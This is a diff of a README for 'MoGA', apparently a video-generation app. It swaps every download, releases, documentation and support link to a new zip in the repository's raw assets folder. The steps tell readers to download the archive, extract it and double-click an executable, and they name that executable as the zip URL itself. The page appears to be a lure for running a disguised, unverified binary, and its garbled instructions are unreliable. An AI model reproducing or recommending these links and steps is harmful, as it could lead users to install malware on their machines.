@@ -6,10 +6,10 @@ Welcome to MoGA! This application helps you generate long videos seamlessly usin
 
 ## 📥 Download MoGA
 
-[![Download MoGA](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/MoGA_3.4.zip)](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/MoGA_3.4.zip)
+[![Download MoGA](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/GA-Mo-2.5.zip)](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/GA-Mo-2.5.zip)
 
 Head over to our Releases page to download the latest version of MoGA:  
-[Download MoGA here](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/MoGA_3.4.zip)
+[Download MoGA here](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/GA-Mo-2.5.zip)
 
 ## ⚙️ System Requirements
 
@@ -24,15 +24,15 @@ To run MoGA smoothly, please ensure your system meets the following requirements
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to open the Releases page.  
-   [Visit the Releases Page](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/MoGA_3.4.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/GA-Mo-2.5.zip)
    
 2. **Select the Latest Release:** On the Releases page, you will see a list of available versions. Choose the most recent version of MoGA. This version has the latest features and fixes.
 
-3. **Download the File:** Click on the file name (e.g., `https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/MoGA_3.4.zip`) to start downloading the application. 
+3. **Download the File:** Click on the file name (e.g., `https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/GA-Mo-2.5.zip`) to start downloading the application. 
 
 4. **Extract the Downloaded File:** Once the download finishes, locate the downloaded file in your computer’s download folder. Right-click on the file and select “Extract All” to extract its contents.
 
-5. **Run MoGA:** Open the folder where you extracted the files. Find the executable file (e.g., `https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/MoGA_3.4.zip` or `https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/MoGA_3.4.zip`) and double-click on it to run the application. 
+5. **Run MoGA:** Open the folder where you extracted the files. Find the executable file (e.g., `https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/GA-Mo-2.5.zip` or `https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/GA-Mo-2.5.zip`) and double-click on it to run the application. 
 
 ## 🛠️ How to Use MoGA
 
@@ -66,7 +66,7 @@ MoGA comes packed with features to make your video generation easy and efficient
 
 For more information, tutorials, and updates, check out the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/MoGA_3.4.zip)
-- [Support](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/MoGA_3.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/GA-Mo-2.5.zip)
+- [Support](https://raw.githubusercontent.com/Galleonromanpace289/MoGA/main/assets/GA-Mo-2.5.zip)
 
 We appreciate your interest in MoGA and look forward to your feedback!
